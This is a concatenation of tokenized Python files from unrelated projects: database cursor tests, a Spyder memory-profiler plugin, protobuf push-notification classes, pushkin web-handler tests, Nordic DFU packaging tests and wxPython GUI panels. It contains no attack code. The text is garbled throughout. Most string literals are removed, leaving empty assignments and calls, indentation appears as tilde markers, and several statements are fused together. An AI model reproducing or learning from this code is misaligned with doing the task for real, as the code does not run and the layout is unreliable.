self . assertEqual ( [ ( 2 , ) ] , list ( cur ) ) \n 
self . assertIsNone ( cur . nextset ( ) ) \n 
\n 
~~ def test_skip_nextset ( self ) : \n 
~~~ cur = self . con . cursor ( ) \n 
cur . execute ( "SELECT 1; SELECT 2;" ) \n 
self . assertEqual ( [ ( 1 , ) ] , list ( cur ) ) \n 
\n 
cur . execute ( "SELECT 42" ) \n 
self . assertEqual ( [ ( 42 , ) ] , list ( cur ) ) \n 
\n 
~~ def test_ok_and_next ( self ) : \n 
~~~ cur = self . con . cursor ( ) \n 
cur . execute ( "SELECT 1; commit; SELECT 2;" ) \n 
self . assertEqual ( [ ( 1 , ) ] , list ( cur ) ) \n 
self . assertTrue ( cur . nextset ( ) ) \n 
self . assertTrue ( cur . nextset ( ) ) \n 
self . assertEqual ( [ ( 2 , ) ] , list ( cur ) ) \n 
self . assertFalse ( bool ( cur . nextset ( ) ) ) \n 
\n 
~~ @ unittest2 . expectedFailure \n 
def test_multi_cursor ( self ) : \n 
~~~ cur1 = self . con . cursor ( ) \n 
cur2 = self . con . cursor ( ) \n 
\n 
cur1 . execute ( "SELECT 1; SELECT 2;" ) \n 
cur2 . execute ( "SELECT 42" ) \n 
\n 
self . assertEqual ( [ ( 1 , ) ] , list ( cur1 ) ) \n 
self . assertEqual ( [ ( 42 , ) ] , list ( cur2 ) ) \n 
\n 
r = cur1 . nextset ( ) \n 
self . assertTrue ( r ) \n 
\n 
self . assertEqual ( [ ( 2 , ) ] , list ( cur1 ) ) \n 
self . assertIsNone ( cur1 . nextset ( ) ) \n 
\n 
~~ def test_multi_statement_warnings ( self ) : \n 
~~~ cursor = self . con . cursor ( ) \n 
\n 
try : \n 
~~~ cursor . execute ( \n 
) \n 
~~ except TypeError : \n 
~~~ self . fail ( ) \n 
\n 
#TODO: How about SSCursor and nextset? \n 
\n 
# -*- coding:utf-8 -*- \n 
# \n 
# Copyright © 2013 Joseph Martinot-Lagarde \n 
# based on p_profiler.py by Santiago Jaramillo \n 
# \n 
# Licensed under the terms of the MIT License \n 
# (see spyderlib/__init__.py for details) \n 
\n 
~~ ~~ ~~ """Memory profiler Plugin""" \n 
\n 
from spyderlib . qt . QtGui import QVBoxLayout , QGroupBox , QLabel \n 
from spyderlib . qt . QtCore import SIGNAL , Qt \n 
\n 
# Local imports \n 
from spyderlib . baseconfig import get_translation \n 
_ = get_translation ( "p_memoryprofiler" , dirname = "spyderplugins" ) \n 
from spyderlib . utils . qthelpers import get_icon , create_action \n 
from spyderlib . plugins import SpyderPluginMixin , PluginConfigPage , runconfig \n 
from spyderplugins . widgets . memoryprofilergui import ( \n 
MemoryProfilerWidget , is_memoryprofiler_installed ) \n 
\n 
\n 
class MemoryProfilerConfigPage ( PluginConfigPage ) : \n 
\n 
~~~ """Widget with configuration options for memory profiler\n    """ \n 
\n 
def setup_page ( self ) : \n 
\n 
~~~ settings_group = QGroupBox ( _ ( "Settings" ) ) \n 
use_color_box = self . create_checkbox ( \n 
_ ( "Use deterministic colors to differentiate functions" ) , \n 
, default = True ) \n 
\n 
results_group = QGroupBox ( _ ( "Results" ) ) \n 
results_label1 = QLabel ( _ ( "Memory profiler plugin results " \n 
"(the output of memory_profiler)\\n" \n 
"is stored here:" ) ) \n 
results_label1 . setWordWrap ( True ) \n 
\n 
# Warning: do not try to regroup the following QLabel contents with \n 
# widgets above -- this string was isolated here in a single QLabel \n 
# on purpose: to fix Issue 863 of Profiler plugon \n 
results_label2 = QLabel ( MemoryProfilerWidget . DATAPATH ) \n 
\n 
results_label2 . setTextInteractionFlags ( Qt . TextSelectableByMouse ) \n 
results_label2 . setWordWrap ( True ) \n 
\n 
settings_layout = QVBoxLayout ( ) \n 
settings_layout . addWidget ( use_color_box ) \n 
settings_group . setLayout ( settings_layout ) \n 
\n 
results_layout = QVBoxLayout ( ) \n 
results_layout . addWidget ( results_label1 ) \n 
results_layout . addWidget ( results_label2 ) \n 
results_group . setLayout ( results_layout ) \n 
\n 
vlayout = QVBoxLayout ( ) \n 
vlayout . addWidget ( settings_group ) \n 
vlayout . addWidget ( results_group ) \n 
vlayout . addStretch ( 1 ) \n 
self . setLayout ( vlayout ) \n 
\n 
\n 
~~ ~~ class MemoryProfiler ( MemoryProfilerWidget , SpyderPluginMixin ) : \n 
\n 
~~~ """Memory profiler""" \n 
CONF_SECTION = \n 
CONFIGWIDGET_CLASS = MemoryProfilerConfigPage \n 
\n 
def __init__ ( self , parent = None ) : \n 
~~~ MemoryProfilerWidget . __init__ ( self , parent = parent ) \n 
SpyderPluginMixin . __init__ ( self , parent ) \n 
\n 
# Initialize plugin \n 
self . initialize_plugin ( ) \n 
\n 
#------ SpyderPluginWidget API -------------------------------------------- \n 
~~ def get_plugin_title ( self ) : \n 
~~~ """Return widget title""" \n 
return _ ( "Memory profiler" ) \n 
\n 
~~ def get_plugin_icon ( self ) : \n 
~~~ """Return widget icon""" \n 
return get_icon ( ) \n 
\n 
~~ def get_focus_widget ( self ) : \n 
~~~ """\n        Return the widget to give focus to when\n        this plugin\'s dockwidget is raised on top-level\n        """ \n 
return self . datatree \n 
\n 
~~ def get_plugin_actions ( self ) : \n 
~~~ """Return a list of actions related to plugin""" \n 
return [ ] \n 
\n 
~~ def on_first_registration ( self ) : \n 
~~~ """Action to be performed on first plugin registration""" \n 
self . main . tabify_plugins ( self . main . inspector , self ) \n 
self . dockwidget . hide ( ) \n 
\n 
~~ def register_plugin ( self ) : \n 
~~~ """Register plugin in Spyder\'s main window""" \n 
self . connect ( self , SIGNAL ( "edit_goto(QString,int,QString)" ) , \n 
self . main . editor . load ) \n 
self . connect ( self , SIGNAL ( ) , \n 
self . main . redirect_internalshell_stdio ) \n 
self . main . add_dockwidget ( self ) \n 
\n 
memoryprofiler_act = create_action ( self , _ ( "Profile memory line by line" ) , \n 
icon = self . get_plugin_icon ( ) , \n 
triggered = self . run_memoryprofiler ) \n 
memoryprofiler_act . setEnabled ( is_memoryprofiler_installed ( ) ) \n 
self . register_shortcut ( memoryprofiler_act , context = "Memory Profiler" , \n 
name = "Run memory profiler" , default = "Ctrl+Shift+F10" ) \n 
\n 
self . main . run_menu_actions += [ memoryprofiler_act ] \n 
self . main . editor . pythonfile_dependent_actions += [ memoryprofiler_act ] \n 
\n 
~~ def refresh_plugin ( self ) : \n 
~~~ """Refresh memory profiler widget""" \n 
pass \n 
\n 
~~ def closing_plugin ( self , cancelable = False ) : \n 
~~~ """Perform actions before parent main window is closed""" \n 
return True \n 
\n 
~~ def apply_plugin_settings ( self , options ) : \n 
~~~ """Apply configuration file\'s plugin settings""" \n 
pass \n 
\n 
#------ Public API -------------------------------------------------------- \n 
~~ def run_memoryprofiler ( self ) : \n 
~~~ """Run memory profiler""" \n 
self . analyze ( self . main . editor . get_current_filename ( ) ) \n 
\n 
~~ def analyze ( self , filename ) : \n 
~~~ """Reimplement analyze method""" \n 
if self . dockwidget and not self . ismaximized : \n 
~~~ self . dockwidget . setVisible ( True ) \n 
self . dockwidget . setFocus ( ) \n 
self . dockwidget . raise_ ( ) \n 
~~ pythonpath = self . main . get_spyder_pythonpath ( ) \n 
runconf = runconfig . get_run_configuration ( filename ) \n 
wdir , args = None , None \n 
if runconf is not None : \n 
~~~ if runconf . wdir_enabled : \n 
~~~ wdir = runconf . wdir \n 
~~ if runconf . args_enabled : \n 
~~~ args = runconf . args \n 
\n 
~~ ~~ MemoryProfilerWidget . analyze ( \n 
self , filename , wdir = wdir , args = args , pythonpath = pythonpath , \n 
use_colors = self . get_option ( , True ) ) \n 
\n 
\n 
#============================================================================== \n 
# The following statements are required to register this 3rd party plugin: \n 
#============================================================================== \n 
~~ ~~ PLUGIN_CLASS = MemoryProfiler \n 
# Generated by the protocol buffer compiler.  DO NOT EDIT! \n 
# source: PushNotificationMessage.proto \n 
\n 
from google . protobuf import descriptor as _descriptor \n 
from google . protobuf import message as _message \n 
from google . protobuf import reflection as _reflection \n 
from google . protobuf import descriptor_pb2 \n 
# @@protoc_insertion_point(imports) \n 
\n 
\n 
\n 
\n 
DESCRIPTOR = _descriptor . FileDescriptor ( \n 
name = , \n 
package = , \n 
serialized_pb = \'\\n\\x1dPushNotificationMessage.proto\\"T\\n\\x10PushNotification\\x12\\x10\\n\\x08login_id\\x18\\x01 \\x01(\\x03\\x12\\r\\n\\x05title\\x18\\x02 \\x01(\\t\\x12\\x0f\\n\\x07\\x63ontent\\x18\\x03 \\x01(\\t\\x12\\x0e\\n\\x06screen\\x18\\x04 \\x01(\\t\\"D\\n\\x18\\x42\\x61tchNotificationRequest\\x12(\\n\\rnotifications\\x18\\x01 \\x03(\\x0b\\x32\\x11.PushNotificationB\\x1b\\n\\x19\\x65u.nordeus.tracking.proto\' \n 
_PUSHNOTIFICATION = _descriptor . Descriptor ( \n 
name = , \n 
full_name = , \n 
filename = None , \n 
file = DESCRIPTOR , \n 
containing_type = None , \n 
fields = [ \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 0 , \n 
number = 1 , type = 3 , cpp_type = 2 , label = 1 , \n 
has_default_value = False , default_value = 0 , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 1 , \n 
number = 2 , type = 9 , cpp_type = 9 , label = 1 , \n 
has_default_value = False , default_value = unicode ( "" , "utf-8" ) , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 2 , \n 
number = 3 , type = 9 , cpp_type = 9 , label = 1 , \n 
has_default_value = False , default_value = unicode ( "" , "utf-8" ) , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 3 , \n 
number = 4 , type = 9 , cpp_type = 9 , label = 1 , \n 
has_default_value = False , default_value = unicode ( "" , "utf-8" ) , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
] , \n 
extensions = [ \n 
] , \n 
nested_types = [ ] , \n 
enum_types = [ \n 
] , \n 
options = None , \n 
is_extendable = False , \n 
extension_ranges = [ ] , \n 
serialized_start = 33 , \n 
serialized_end = 117 , \n 
) \n 
\n 
_BATCHNOTIFICATIONREQUEST = _descriptor . Descriptor ( \n 
name = , \n 
full_name = , \n 
filename = None , \n 
file = DESCRIPTOR , \n 
containing_type = None , \n 
fields = [ \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 0 , \n 
number = 1 , type = 11 , cpp_type = 10 , label = 3 , \n 
has_default_value = False , default_value = [ ] , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
] , \n 
extensions = [ \n 
] , \n 
nested_types = [ ] , \n 
enum_types = [ \n 
] , \n 
options = None , \n 
is_extendable = False , \n 
extension_ranges = [ ] , \n 
serialized_start = 119 , \n 
serialized_end = 187 , \n 
) \n 
\n 
_BATCHNOTIFICATIONREQUEST . fields_by_name [ ] . message_type = _PUSHNOTIFICATION \n 
DESCRIPTOR . message_types_by_name [ ] = _PUSHNOTIFICATION \n 
DESCRIPTOR . message_types_by_name [ ] = _BATCHNOTIFICATIONREQUEST \n 
\n 
\n 
class PushNotification ( _message . Message ) : \n 
~~~ __metaclass__ = _reflection . GeneratedProtocolMessageType \n 
DESCRIPTOR = _PUSHNOTIFICATION \n 
\n 
# @@protoc_insertion_point(class_scope:PushNotification) \n 
\n 
\n 
~~ class BatchNotificationRequest ( _message . Message ) : \n 
~~~ __metaclass__ = _reflection . GeneratedProtocolMessageType \n 
DESCRIPTOR = _BATCHNOTIFICATIONREQUEST \n 
\n 
# @@protoc_insertion_point(class_scope:BatchNotificationRequest) \n 
\n 
\n 
~~ DESCRIPTOR . has_options = True \n 
DESCRIPTOR . _options = _descriptor . _ParseOptions ( descriptor_pb2 . FileOptions ( ) , # @@protoc_insertion_point(module_scope) \n 
import pytest \n 
from pushkin import pushkin_cli \n 
import tornado . web \n 
from pushkin import context \n 
from pushkin . database import database \n 
from pushkin . request . request_processor import RequestProcessor \n 
from pushkin . requesthandlers . events import JsonEventHandler \n 
from pushkin . requesthandlers . notifications import JsonNotificationHandler \n 
from pushkin import test_config_ini_path \n 
from pushkin import config \n 
\n 
\n 
@ pytest . fixture \n 
def setup_database ( ) : \n 
~~~ database . create_database ( ) \n 
\n 
\n 
~~ @ pytest . fixture \n 
def mock_processor ( mocker ) : \n 
~~~ \n 
mocker . patch ( ) \n 
mocker . patch ( ) \n 
\n 
\n 
~~ @ pytest . fixture \n 
def app ( ) : \n 
~~~ pushkin_cli . CONFIGURATION_FILENAME = test_config_ini_path \n 
pushkin_cli . init ( ) \n 
return pushkin_cli . create_app ( ) \n 
\n 
~~ @ pytest . fixture \n 
def notification_batch_json ( ) : \n 
~~~ \n 
return \'\'\'\n    {\n    "notifications": [\n            {\n                "login_id" : 1338,\n                "title" : "Msg title",\n                "content" : "Text of a message",\n                "screen" : "some_screen_id"\n            }\n        ]\n    }\n    \'\'\' \n 
\n 
~~ @ pytest . fixture \n 
def post_notification_url ( base_url ) : \n 
~~~ return base_url + config . json_notification_handler_url \n 
\n 
~~ @ pytest . fixture \n 
def event_batch_json ( ) : \n 
~~~ \n 
return \'\'\'\n    {\n    "events": [\n            {\n                "user_id" : 123,\n                "event_id" : 1,\n                "timestamp" : 12345,\n                "pairs": {\n                    "some_constant" : "6",\n                    "world_id" : "1"\n                }\n            }\n        ]\n    }\n    \'\'\' \n 
\n 
\n 
~~ @ pytest . fixture \n 
def post_event_url ( base_url ) : \n 
~~~ return base_url + config . json_event_handler_url \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
@ pytest . mark . parametrize ( "input" , [ \n 
( ) , \n 
( ) , \n 
] ) \n 
def test_post_notification_empty_request ( setup_database , mock_processor , http_client , post_notification_url ~~~ request = tornado . httpclient . HTTPRequest ( post_notification_url , method = , body = input ) \n 
with pytest . raises ( tornado . httpclient . HTTPError ) : \n 
~~~ yield http_client . fetch ( request ) \n 
~~ assert not context . request_processor . submit . called \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
def test_post_notification ( setup_database , mock_processor , http_client , post_notification_url , \n 
notification_batch_json ) : \n 
~~~ \n 
request = tornado . httpclient . HTTPRequest ( post_notification_url , method = , body = notification_batch_json response = yield http_client . fetch ( request ) \n 
assert response . code == 200 \n 
assert context . request_processor . submit . called \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
@ pytest . mark . parametrize ( "input" , [ \n 
( ) , \n 
( ) , \n 
] ) \n 
def test_post_event_empty_request ( setup_database , mock_processor , http_client , post_event_url , input ~~~ \n 
request = tornado . httpclient . HTTPRequest ( post_event_url , method = , body = input ) \n 
with pytest . raises ( tornado . httpclient . HTTPError ) : \n 
~~~ yield http_client . fetch ( request ) \n 
~~ assert not context . request_processor . submit . called \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
def test_post_event ( setup_database , mock_processor , http_client , post_event_url , event_batch_json ) : \n 
~~~ \n 
context . request_processor . submit . return_value = True \n 
request = tornado . httpclient . HTTPRequest ( post_event_url , method = , body = event_batch_json ) \n 
response = yield http_client . fetch ( request ) \n 
assert response . code == 200 \n 
assert context . request_processor . submit . called \n 
\n 
\n 
~~ @ pytest . mark . gen_test \n 
def test_post_event_service_unavailable ( setup_database , mock_processor , http_client , post_event_url , app ) : \n 
~~~ \n 
context . request_processor . submit . return_value = False \n 
request = tornado . httpclient . HTTPRequest ( post_event_url , method = , body = event_batch_json ) \n 
RequestProcessor . submit . return_value = False \n 
with pytest . raises ( tornado . httpclient . HTTPError ) : \n 
~~~ yield http_client . fetch ( request ) \n 
# Copyright (c) 2015, Nordic Semiconductor \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
# \n 
# * Redistributions of source code must retain the above copyright notice, this \n 
#   list of conditions and the following disclaimer. \n 
# \n 
# * Redistributions in binary form must reproduce the above copyright notice, \n 
#   this list of conditions and the following disclaimer in the documentation \n 
#   and/or other materials provided with the distribution. \n 
# \n 
# * Neither the name of Nordic Semiconductor ASA nor the names of its \n 
#   contributors may be used to endorse or promote products derived from \n 
#   this software without specific prior written permission. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE \n 
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE \n 
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL \n 
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR \n 
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER \n 
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, \n 
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE \n 
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
\n 
~~ ~~ import json \n 
import os \n 
import tempfile \n 
import unittest \n 
from zipfile import ZipFile \n 
import shutil \n 
\n 
from nordicsemi . dfu . package import Package \n 
\n 
\n 
class TestPackage ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . work_directory = tempfile . mkdtemp ( prefix = "nrf_dfu_tests_" ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ shutil . rmtree ( self . work_directory , ignore_errors = True ) \n 
\n 
~~ def test_generate_package_application ( self ) : \n 
~~~ self . p = Package ( \n 
dev_type = 1 , \n 
dev_rev = 2 , \n 
app_version = 100 , \n 
sd_req = [ 0x1000 , 0xfffe ] , \n 
app_fw = "firmwares/bar.hex" \n 
) \n 
\n 
pkg_name = "mypackage.zip" \n 
\n 
self . p . generate_package ( pkg_name , preserve_work_directory = False ) \n 
expected_zip_content = [ "manifest.json" , "bar.bin" , "bar.dat" ] \n 
\n 
with ZipFile ( pkg_name , ) as pkg : \n 
~~~ infolist = pkg . infolist ( ) \n 
\n 
for file_information in infolist : \n 
~~~ self . assertTrue ( file_information . filename in expected_zip_content ) \n 
self . assertGreater ( file_information . file_size , 0 ) \n 
\n 
# Extract all and load json document to see if it is correct regarding to paths \n 
~~ pkg . extractall ( self . work_directory ) \n 
\n 
with open ( os . path . join ( self . work_directory , ) , ) as f : \n 
~~~ _json = json . load ( f ) \n 
self . assertEqual ( , _json [ ] [ ] [ ] ) \n 
self . assertEqual ( , _json [ ] [ ] [ ] ) \n 
self . assertTrue ( not in _json [ ] ) \n 
self . assertTrue ( not in _json [ ] ) \n 
self . assertTrue ( not in _json [ ] ) \n 
\n 
~~ ~~ ~~ def test_generate_package_sd_bl ( self ) : \n 
~~~ self . p = Package ( dev_type = 1 , \n 
dev_rev = 2 , \n 
app_version = 100 , \n 
sd_req = [ 0x1000 , 0xfffe ] , \n 
softdevice_fw = "firmwares/foo.hex" , \n 
bootloader_fw = "firmwares/bar.hex" ) \n 
\n 
pkg_name = "mypackage.zip" \n 
\n 
self . p . generate_package ( pkg_name , preserve_work_directory = False ) \n 
\n 
expected_zip_content = [ "manifest.json" , "sd_bl.bin" , "sd_bl.dat" ] \n 
\n 
with ZipFile ( pkg_name , ) as pkg : \n 
~~~ infolist = pkg . infolist ( ) \n 
\n 
for file_information in infolist : \n 
~~~ self . assertTrue ( file_information . filename in expected_zip_content ) \n 
self . assertGreater ( file_information . file_size , 0 ) \n 
\n 
# Extract all and load json document to see if it is correct regarding to paths \n 
~~ pkg . extractall ( self . work_directory ) \n 
\n 
with open ( os . path . join ( self . work_directory , ) , ) as f : \n 
~~~ _json = json . load ( f ) \n 
self . assertEqual ( , _json [ ] [ ] [ self . assertEqual ( , _json [ ] [ ] [ \n 
~~ ~~ ~~ def test_unpack_package_a ( self ) : \n 
~~~ self . p = Package ( dev_type = 1 , \n 
dev_rev = 2 , \n 
app_version = 100 , \n 
sd_req = [ 0x1000 , 0xffff ] , \n 
softdevice_fw = "firmwares/bar.hex" , \n 
dfu_ver = 0.6 ) \n 
pkg_name = os . path . join ( self . work_directory , "mypackage.zip" ) \n 
self . p . generate_package ( pkg_name , preserve_work_directory = False ) \n 
\n 
unpacked_dir = os . path . join ( self . work_directory , "unpacked" ) \n 
manifest = self . p . unpack_package ( os . path . join ( self . work_directory , pkg_name ) , unpacked_dir ) \n 
self . assertIsNotNone ( manifest ) \n 
self . assertEqual ( , manifest . softdevice . bin_file ) \n 
self . assertEqual ( 0 , manifest . softdevice . init_packet_data . ext_packet_id ) \n 
self . assertIsNotNone ( manifest . softdevice . init_packet_data . firmware_crc16 ) \n 
\n 
~~ def test_unpack_package_b ( self ) : \n 
~~~ self . p = Package ( dev_type = 1 , \n 
dev_rev = 2 , \n 
app_version = 100 , \n 
sd_req = [ 0x1000 , 0xffff ] , \n 
softdevice_fw = "firmwares/bar.hex" , \n 
dfu_ver = 0.7 ) \n 
pkg_name = os . path . join ( self . work_directory , "mypackage.zip" ) \n 
self . p . generate_package ( pkg_name , preserve_work_directory = False ) \n 
\n 
unpacked_dir = os . path . join ( self . work_directory , "unpacked" ) \n 
manifest = self . p . unpack_package ( os . path . join ( self . work_directory , pkg_name ) , unpacked_dir ) \n 
self . assertIsNotNone ( manifest ) \n 
self . assertEqual ( , manifest . softdevice . bin_file ) \n 
self . assertEqual ( 1 , manifest . softdevice . init_packet_data . ext_packet_id ) \n 
self . assertIsNone ( manifest . softdevice . init_packet_data . firmware_crc16 ) \n 
self . assertIsNotNone ( manifest . softdevice . init_packet_data . firmware_hash ) \n 
\n 
~~ def test_unpack_package_c ( self ) : \n 
~~~ self . p = Package ( dev_type = 1 , \n 
dev_rev = 2 , \n 
app_version = 100 , \n 
sd_req = [ 0x1000 , 0xffff ] , \n 
softdevice_fw = "firmwares/bar.hex" , \n 
key_file = "key.pem" ) \n 
pkg_name = os . path . join ( self . work_directory , "mypackage.zip" ) \n 
self . p . generate_package ( pkg_name , preserve_work_directory = False ) \n 
\n 
unpacked_dir = os . path . join ( self . work_directory , "unpacked" ) \n 
manifest = self . p . unpack_package ( os . path . join ( self . work_directory , pkg_name ) , unpacked_dir ) \n 
self . assertIsNotNone ( manifest ) \n 
self . assertEqual ( , manifest . softdevice . bin_file ) \n 
self . assertEqual ( 2 , manifest . softdevice . init_packet_data . ext_packet_id ) \n 
self . assertIsNone ( manifest . softdevice . init_packet_data . firmware_crc16 ) \n 
self . assertIsNotNone ( manifest . softdevice . init_packet_data . firmware_hash ) \n 
self . assertIsNotNone ( manifest . softdevice . init_packet_data . init_packet_ecds ) \n 
self . assertEqual ( manifest . dfu_version , 0.8 ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
# Copyright 2014 Numenta \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ from agamotto . utils import execute , grepc \n 
\n 
\n 
def installed ( package ) : \n 
~~~ """Confirm that a package is installed""" \n 
# TODO: Make this work with apt/dpkg \n 
try : \n 
~~~ return grepc ( execute ( "yum list installed %s" % package ) , package ) > 0 \n 
~~ except Exception , _e : \n 
~~~ return False \n 
\n 
\n 
~~ ~~ def is_installed ( package ) : \n 
~~~ """Convenience alias to make the tests look nicer""" \n 
return installed ( package ) \n 
~~ __author__ = \n 
import wx \n 
from wx import AboutBox , AboutDialogInfo , ClientDC \n 
from wx . lib . wordwrap import wordwrap \n 
from odmtools . meta import data \n 
\n 
class frmAbout ( wx . Dialog ) : \n 
~~~ def __init__ ( self , parent ) : \n 
~~~ self . parent = parent \n 
info = AboutDialogInfo ( ) \n 
info . Name = data . app_name \n 
info . Version = data . version \n 
info . Copyright = data . copyright \n 
info . Description = wordwrap ( data . description , 350 , ClientDC ( parent ) ) \n 
info . WebSite = data . website \n 
info . Developers = data . developers \n 
info . License = wordwrap ( data . license , 500 , ClientDC ( parent ) ) \n 
# Then we call wx.AboutBox giving it that info object \n 
AboutBox ( info ) \n 
#self.ShowModal()#Boa:FramePanel:pnlMethods \n 
\n 
~~ ~~ import wx \n 
import wx . grid \n 
import wx . richtext \n 
from odmtools . odmdata import Method \n 
\n 
[ wxID_PNLMETHOD , wxID_PNLMETHODSLISTCTRL1 , wxID_PNLMETHODSRBCREATENEW , \n 
wxID_PNLMETHODSRBGENERATE , wxID_PNLMETHODSRBSELECT , \n 
wxID_PNLMETHODSRICHTEXTCTRL1 , \n 
] = [ wx . NewId ( ) for _init_ctrls in range ( 6 ) ] \n 
\n 
from odmtools . common . logger import LoggerTool \n 
import logging \n 
tool = LoggerTool ( ) \n 
logger = tool . setupLogger ( __name__ , __name__ + , , logging . DEBUG ) \n 
\n 
class pnlMethod ( wx . Panel ) : \n 
~~~ def _init_ctrls ( self , prnt ) : \n 
\n 
~~~ wx . Panel . __init__ ( self , id = wxID_PNLMETHOD , name = , \n 
parent = prnt , pos = wx . Point ( 135 , 307 ) , size = wx . Size ( 439 , 357 ) , \n 
style = wx . TAB_TRAVERSAL ) \n 
self . SetClientSize ( wx . Size ( 423 , 319 ) ) \n 
\n 
self . rbGenerate = wx . RadioButton ( id = wxID_PNLMETHODSRBGENERATE , \n 
label = , name = , \n 
parent = self , pos = wx . Point ( 16 , 8 ) , size = wx . Size ( 392 , 16 ) , style = 0 ) \n 
self . rbGenerate . SetValue ( True ) \n 
self . rbGenerate . Bind ( wx . EVT_RADIOBUTTON , self . OnRbGenerateRadiobutton , \n 
id = wxID_PNLMETHODSRBGENERATE ) \n 
\n 
self . rbSelect = wx . RadioButton ( id = wxID_PNLMETHODSRBSELECT , \n 
label = , name = , parent = self , \n 
pos = wx . Point ( 16 , 32 ) , size = wx . Size ( 392 , 13 ) , style = 0 ) \n 
self . rbSelect . SetValue ( False ) \n 
self . rbSelect . Bind ( wx . EVT_RADIOBUTTON , self . OnRbSelectRadiobutton , \n 
id = wxID_PNLMETHODSRBSELECT ) \n 
\n 
self . rbCreateNew = wx . RadioButton ( id = wxID_PNLMETHODSRBCREATENEW , \n 
label = , name = , parent = self , \n 
pos = wx . Point ( 16 , 208 ) , size = wx . Size ( 392 , 13 ) , style = 0 ) \n 
self . rbCreateNew . SetValue ( False ) \n 
self . rbCreateNew . Bind ( wx . EVT_RADIOBUTTON , self . OnRbCreateNewRadiobutton , \n 
id = wxID_PNLMETHODSRBCREATENEW ) \n 
\n 
self . txtMethodDescrip = wx . richtext . RichTextCtrl ( id = wxID_PNLMETHODSRICHTEXTCTRL1 , \n 
parent = self , pos = wx . Point ( 16 , 224 ) , size = wx . Size ( 392 , 84 ) , \n 
style = wx . richtext . RE_MULTILINE , value = ) \n 
self . txtMethodDescrip . Enable ( False ) \n 
self . txtMethodDescrip . Bind ( wx . EVT_SET_FOCUS , self . OnTxtMethodDescripSetFocus ) \n 
self . txtMethodDescrip . Bind ( wx . EVT_KILL_FOCUS , self . OnTxtMethodDescripKillFocus ) \n 
\n 
self . lstMethods = wx . ListCtrl ( id = wxID_PNLMETHODSLISTCTRL1 , \n 
name = , parent = self , pos = wx . Point ( 16 , 48 ) , \n 
size = wx . Size ( 392 , 152 ) , style = wx . LC_REPORT | wx . LC_SINGLE_SEL ) \n 
\n 
\n 
self . lstMethods . InsertColumn ( 0 , ) \n 
self . lstMethods . InsertColumn ( 1 , ) \n 
self . lstMethods . InsertColumn ( 2 , ) \n 
self . lstMethods . SetColumnWidth ( 0 , 200 ) \n 
self . lstMethods . SetColumnWidth ( 1 , 153 ) \n 
self . lstMethods . SetColumnWidth ( 2 , 0 ) \n 
self . lstMethods . Enable ( False ) \n 
\n 
\n 
\n 
\n 
~~ def __init__ ( self , parent , id , pos , size , style , name , sm , method ) : \n 
~~~ self . series_service = sm . get_series_service ( ) \n 
self . prev_val = method \n 
self . _init_ctrls ( parent ) \n 
\n 
~~ def OnRbGenerateRadiobutton ( self , event ) : \n 
~~~ self . lstMethods . Enable ( False ) \n 
self . txtMethodDescrip . Enable ( False ) \n 
\n 
event . Skip ( ) \n 
\n 
~~ def OnRbSelectRadiobutton ( self , event ) : \n 
~~~ self . lstMethods . Enable ( True ) \n 
self . txtMethodDescrip . Enable ( False ) \n 
\n 
event . Skip ( ) \n 
\n 
~~ def OnRbCreateNewRadiobutton ( self , event ) : \n 
~~~ self . lstMethods . Enable ( False ) \n 
self . txtMethodDescrip . Enable ( True ) \n 
\n 
event . Skip ( ) \n 
\n 
~~ def OnTxtMethodDescripSetFocus ( self , event ) : \n 
~~~ if self . txtMethodDescrip . GetValue ( ) == "Method Description" : \n 
~~~ self . txtMethodDescrip . SetValue ( "" ) \n 
\n 
~~ event . Skip ( ) \n 
\n 
~~ def OnTxtMethodDescripKillFocus ( self , event ) : \n 
~~~ if self . txtMethodDescrip . GetValue ( ) == "" : \n 
